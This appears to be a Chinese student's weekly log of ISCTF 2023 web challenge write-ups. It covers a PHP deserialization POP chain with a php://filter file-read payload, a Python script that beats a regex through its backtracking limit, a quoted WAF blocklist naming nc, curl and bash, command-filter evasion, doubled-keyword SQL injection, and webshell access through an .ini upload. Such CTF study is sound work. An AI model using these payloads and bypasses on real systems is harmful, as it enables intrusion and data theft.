## 本周重点
### 1.知识分享
## 圣杯战争!!!
打开题目看到
```
 <?php
highlight_file(__FILE__);
error_reporting(0);

class artifact{
    public $excalibuer;
    public $arrow;
    public function __toString(){
        echo "为Saber选择了对的武器!<br>";
        return $this->excalibuer->arrow;
    }
}

class prepare{
    public $release;
    public function __get($key){
        $functioin = $this->release;
        echo "蓄力!咖喱棒！！<br>";
        return $functioin();
    }
}
class saber{
    public $weapon;
    public function __invoke(){
        echo "胜利！<br>";
        include($this->weapon);
    }
}
class summon{
    public $Saber;
    public $Rider;

    public function __wakeup(){
        echo "开始召唤从者！<br>";
        echo $this->Saber;
    }
}

if(isset($_GET['payload'])){
    unserialize($_GET['payload']);
}
?> 
```
分析可得链子为summon→artifact→prepare→saber，分别是反序列化调用wakeup方法，然后echo会调用tostring方法我们进入他所在的类，然后new一个类时会调用get函数，在get所在类有functioin()，当函数调用时会触发invoke方法，最后include伪协议读取flag
```
$a=new summon;
$a->Saber=new artifact;
$a->Saber->arrow=new prepare;
$a->Saber->excalibuer = &$a->Saber->arrow;
$a->Saber->excalibuer->release=new saber;
$a->Saber->excalibuer->release->weapon="php://filter/read=convert.base64-encode/resource=flag.php";
echo serialize($a);
```
得到flag的base编码
![67f38c38f97e321aa6e0ebeff60f62e9.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700998694455-47921322-ef87-42b6-ac44-4787c03d4fe3.png#averageHue=%23fcfbfb&clientId=u7fd39338-1816-4&from=paste&height=687&id=u0ce63d26&originHeight=859&originWidth=1902&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146252&status=done&style=none&taskId=u02a3f32d-e650-4628-865d-e811f4f4ed9&title=&width=1521.6)
解得flag
![c22f114982a91f803eb894718e432e64.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700998808568-7fdbb2f0-ac59-4d1c-bf94-25c9373d7851.png#averageHue=%23212c37&clientId=u7fd39338-1816-4&from=paste&height=408&id=u21106ca3&originHeight=510&originWidth=950&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22342&status=done&style=none&taskId=u60455c78-2320-49cc-9801-5314e51344c&title=&width=760)
## where_is_the_flag
打开题目看到给了一句话，直接蚁剑连
![19f34d810b33be4ed7f6fcd3abb3f0ce.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700998904595-0e13d91a-9c00-48c7-9327-ccd46994ae62.png#averageHue=%23fefdfb&clientId=u7fd39338-1816-4&from=paste&height=172&id=u32e3dc8a&originHeight=215&originWidth=608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13144&status=done&style=none&taskId=u1152ba98-0163-48c5-a743-5c6dabdf3f1&title=&width=486.4)
![2b5810a89406180696b3821999771983.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700998987029-1bc09329-63c9-4b1d-aa26-e95ddf706d91.png#averageHue=%23eeeeee&clientId=u7fd39338-1816-4&from=paste&height=531&id=ud402465e&originHeight=664&originWidth=955&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44309&status=done&style=none&taskId=ub4d847cd-8b27-482c-b29b-8b122edf237&title=&width=764)
进入shell找flag
![ada30b9ca6170a07acc301c0ad2261c6.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701000653393-6845856e-db70-4de1-a167-b7afc39042b5.png#averageHue=%23060606&clientId=u7fd39338-1816-4&from=paste&height=127&id=u285ce64e&originHeight=159&originWidth=676&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9772&status=done&style=none&taskId=uae5efa0f-2e6b-4bbe-a9d8-1c64b8c00dc&title=&width=540.8)
![f13266d02b5004a793998b4b82c81a4d.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701000625875-e6a02711-f832-4363-8fb1-272e28dd5cb6.png#averageHue=%23050404&clientId=u7fd39338-1816-4&from=paste&height=138&id=u8549d862&originHeight=172&originWidth=669&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9413&status=done&style=none&taskId=u33c71831-cea9-4f38-8828-4898e1b41b5&title=&width=535)
![8f664251f1b5298aa8e2fb97abef092f.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701000664372-f44defab-ca0b-4130-8ca3-bd4c7c04767e.png#averageHue=%23020202&clientId=u7fd39338-1816-4&from=paste&height=313&id=u0257a82d&originHeight=391&originWidth=547&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10630&status=done&style=none&taskId=uefb8f03a-dd0b-4cda-8771-c07fc7d3e6e&title=&width=438)
![6b90a42fab31e937dd262c16cb87d9a5.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701000681239-12fa9a29-279b-46c5-8a37-b9045d7e74e3.png#averageHue=%23070606&clientId=u7fd39338-1816-4&from=paste&height=141&id=u5ebcd8db&originHeight=176&originWidth=1242&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14915&status=done&style=none&taskId=u66b5125b-3a3e-4a8b-b1e9-983fb7c9f0b&title=&width=993.6)
得到flag：ISCTF{a8144b4e-d321-4b18-b6e0-f8f4319365d5}
## 绕进你的心里
看到题目
![d5f058ff66d272063b63a301c0908b3a.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701001011891-504cab72-c6f8-46c7-bb8c-a4b4439bf15a.png#averageHue=%23fefdfd&clientId=u7fd39338-1816-4&from=paste&height=470&id=uee6c3545&originHeight=588&originWidth=677&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50146&status=done&style=none&taskId=u5a437379-a24e-4412-b0e9-01317667a2e&title=&width=541.6)
和之前一个比赛一样，正则回溯次数限制，然后MD5和数字正则都用数组绕过即可
```
import requests
url="http://43.249.195.138:22390/?hongmeng[]=1&shennong[]=2&zhurong[]=3"
data={
    'pan[gu':'very'*250000+'2023ISCTF'
}
r=requests.post(url,data=data)
print(r.text)
```
得到flag
![f6860f4b5fa9a131f58f16f92b83cc10.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701001416503-e7f1ff54-1b95-475c-b2e3-fe894d9bae1c.png#averageHue=%231f1d1c&clientId=u7fd39338-1816-4&from=paste&height=33&id=u206fa4d2&originHeight=41&originWidth=871&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3510&status=done&style=none&taskId=ufbbc3576-aabf-478f-92c4-a1767f3186a&title=&width=696.8)
## wafr
康康题目
```
 <?php
/*
Read /flaggggggg.txt
*/
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);

if(preg_match("/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i", $_POST['code'])){//strings
    die("想读我文件？大胆。");
}
elseif (preg_match("/\^|\||\~|\\$|\%|jay/i", $_POST['code'])){
    die("无字母数字RCE？大胆！");
}
elseif (preg_match("/bash|nc|curl|sess|\{|:|;/i", $_POST['code'])){
    die("奇技淫巧？大胆！！");
}
elseif (preg_match("/fl|ag|\.|x/i", $_POST['code'])){
    die("大胆！！！");
}
else{
    assert($_POST['code']);
} 
```
没有过滤命令执行函数，直接system("ls /")看到flag在根目录
![790e27de08b948e50b7104dfa2d10036.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701001764644-cab4c4fb-3bc2-4c53-ae94-b60861aac5fa.png#averageHue=%23fdfbfa&clientId=u7fd39338-1816-4&from=paste&height=484&id=u98174186&originHeight=605&originWidth=1361&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83334&status=done&style=none&taskId=u36ac6345-3db7-4f7a-88a1-b2d82a63619&title=&width=1088.8)
但是cat和flag都过滤了，我们用‘’和/f*来绕过得到flag
![7e808de62dedee7a7f41397dd10058de.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701001845132-342baa12-7384-4ba5-a4c7-3b5ea737d0d3.png#averageHue=%23fdfbfb&clientId=u7fd39338-1816-4&from=paste&height=236&id=u60ed3e50&originHeight=295&originWidth=1448&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47401&status=done&style=none&taskId=u95610519-baa8-4ef0-aca4-45d280645cb&title=&width=1158.4)
## easy_website
打开题目看到登录界面
![70b6d00eb6ad73890e7d1ad6abcee176.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996469805-5f43ac5a-78a4-4dcc-a845-6265a262c072.png#averageHue=%233b4f4d&clientId=ude32f381-2c81-4&from=paste&height=456&id=u41ee4560&originHeight=570&originWidth=489&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=358416&status=done&style=none&taskId=ub689abea-43a1-4371-bfa8-c21a5937f70&title=&width=391.2)
尝试admin/admin可以登录但没有flag
尝试sql注入发现过滤了很多东西
![ee39bf3f81deb2ef694541f10664f966.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996547112-d9a0d189-7cae-4f63-8661-d8b361f212a1.png#averageHue=%23375857&clientId=ude32f381-2c81-4&from=paste&height=442&id=uf078ce28&originHeight=553&originWidth=488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=369476&status=done&style=none&taskId=uaefaa60a-4a50-4228-ae38-180372bc079&title=&width=390.4)
然后发现有双写注入和空格过滤
![70cc5d1f5d55dae748bea15cf01df3bf.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996605685-5785fe59-9c86-40b9-90c6-119c6e516984.png#averageHue=%23263942&clientId=ude32f381-2c81-4&from=paste&height=369&id=u7d0e459e&originHeight=461&originWidth=476&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=288615&status=done&style=none&taskId=u4964df23-6b68-406d-8e12-e3657278ffc&title=&width=380.8)
查回显发现or也被过滤了
![a744bfd929dfb1c27c7a5900a8cd1c66.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996630066-93714deb-2c2e-481e-874e-424c314b4333.png#averageHue=%233e534e&clientId=ude32f381-2c81-4&from=paste&height=482&id=ua5615430&originHeight=602&originWidth=491&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=409961&status=done&style=none&taskId=ueb4af81e-9df2-43d2-a233-39f2a0df162&title=&width=392.8)
发现可以联合注入
![44300137fde635512bc1b617b06f6591.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996676042-99a88791-8d1a-4c1b-857c-ee7003069f84.png#averageHue=%23375658&clientId=ude32f381-2c81-4&from=paste&height=412&id=ubf2eed50&originHeight=515&originWidth=472&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=306998&status=done&style=none&taskId=u09f958df-1918-452c-9039-eba7497838a&title=&width=377.6)
联合注入查库
![1515a1d3e51d793e0296502005aee1c8.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996711462-bd86e726-9a65-4c6b-8dc2-bfc338731e50.png#averageHue=%23385657&clientId=ude32f381-2c81-4&from=paste&height=400&id=u18931379&originHeight=500&originWidth=432&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=274308&status=done&style=none&taskId=u9a22a396-b4f2-490e-ac86-ad4d1ac9131&title=&width=345.6)
最后尝试注入猜表名password无结果，但passwoorrd找到flag
![f05f01b53ea64128653e692f99fb6faf.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700996802112-f790c578-bc5a-4921-90e2-3f2a62ea75c9.png#averageHue=%23385556&clientId=ude32f381-2c81-4&from=paste&height=427&id=u6efcefca&originHeight=534&originWidth=475&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=327006&status=done&style=none&taskId=u18182e0e-bdb0-48d8-9481-cdf418a78ae&title=&width=380)
## ez_ini
看题目可知为ini文件上传，但是按一般方法还是失败最后通过base绕过了
![3e700ee633bc789014321a7e62538563.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701002633944-3fac9057-5e47-4464-8239-41a56f98d892.png#averageHue=%23cca06b&clientId=u7fd39338-1816-4&from=paste&height=71&id=u8f8e6fc5&originHeight=89&originWidth=846&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6208&status=done&style=none&taskId=uc346be10-0950-4d05-9f47-5415f53c3cb&title=&width=676.8)
![f946f996ae56175080224f0b49d2b794.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701002643472-994740cd-7001-4f90-a13f-3ba54221b0c3.png#averageHue=%231b2631&clientId=u7fd39338-1816-4&from=paste&height=259&id=u7491bbe9&originHeight=324&originWidth=631&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4307&status=done&style=none&taskId=ube940564-9d23-40cf-ba97-c3cd85f8f8e&title=&width=504.8)
![8b4d7e6905ef33fcdba3b110368aa8d5.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701002651042-94bdbf7b-c5a4-44aa-ab1e-cd788140315e.png#averageHue=%23c1945f&clientId=u7fd39338-1816-4&from=paste&height=55&id=u923db03a&originHeight=69&originWidth=501&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4586&status=done&style=none&taskId=u0c016754-cb0a-4f96-912e-0dc11b678ea&title=&width=400.8)
![347eeb6c477e15f78308f8fa141b4743.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701002660047-88784b80-e379-46a8-a015-69b1f7ba6c28.png#averageHue=%23eeeeee&clientId=u7fd39338-1816-4&from=paste&height=516&id=ub3227ef9&originHeight=645&originWidth=959&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45061&status=done&style=none&taskId=uc90ba95a-5783-40d8-a087-27afb28e9c2&title=&width=767.2)
成功链接，打开shell得到flag
![4cabe52f9f929d4115a34b0925a1f3b6.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701002696188-1e89ceb0-166b-4f55-8274-91df491a7cec.png#averageHue=%23030202&clientId=u7fd39338-1816-4&from=paste&height=374&id=uf325ede4&originHeight=468&originWidth=562&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15016&status=done&style=none&taskId=u71f30d30-ebfc-4328-9e50-59c56adbc5b&title=&width=449.6)
## 总结
这周打了ISCTF和a&d联赛，ad给密码和misc给ak了，然后pwn那个应该是二面题，改了好几次payload终于知道当时为什么没有出解，还是格式不太规范，挺感慨的，isCTF前两天Webak然后misc也顺风顺水，甚至冲到总榜第四了，但是随着题目越来越难，pwn和re题开始站多，排名掉了很多，这次is，Web上感觉要么一把嗦，要么做不出，但是misc在各种查阅资料和脚本爷们的脚本编写下，我们没有misc手却快把

